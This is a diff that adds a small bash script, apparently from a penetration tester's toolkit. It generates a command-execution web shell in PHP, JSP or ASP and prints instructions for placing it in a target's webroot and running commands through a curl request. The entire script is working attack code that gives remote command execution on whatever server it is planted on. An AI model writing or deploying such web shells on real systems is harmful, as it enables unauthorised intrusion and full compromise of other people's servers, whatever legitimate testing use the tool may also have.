@@ -1,0 +1,12 @@
+#!/usr/bin/env bash
+# webshell [php|jsp|asp]   drop a cmd webshell into ~/cyber/tools/serve (grab with serve)
+t="${1:-php}"; d="$HOME/cyber/tools/serve"; mkdir -p "$d"
+case "$t" in
+  php)  echo '<?php system($_REQUEST["c"]); ?>' > "$d/shell.php"; f=shell.php;;
+  jsp)  printf '%s\n' '<%@ page import="java.util.*,java.io.*" %><% if(request.getParameter("c")!=null){Process p=Runtime.getRuntime().exec(request.getParameter("c"));BufferedReader b=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=b.readLine())!=null)out.println(l);} %>' > "$d/shell.jsp"; f=shell.jsp;;
+  asp)  echo '<% eval request("c") %>' > "$d/shell.asp"; f=shell.asp;;
+  *) echo "usage: webshell [php|jsp|asp]"; exit 1;;
+esac
+G=$'\e[38;2;158;206;106m'; D=$'\e[38;2;86;95;137m'; X=$'\e[0m'
+echo "${G}created${X} $d/$f   ${D}usage after upload:${X} curl 'http://TARGET/$f?c=id'"
+echo "${D}serve it:${X} serve   (then transfer $f to the target's webroot)"
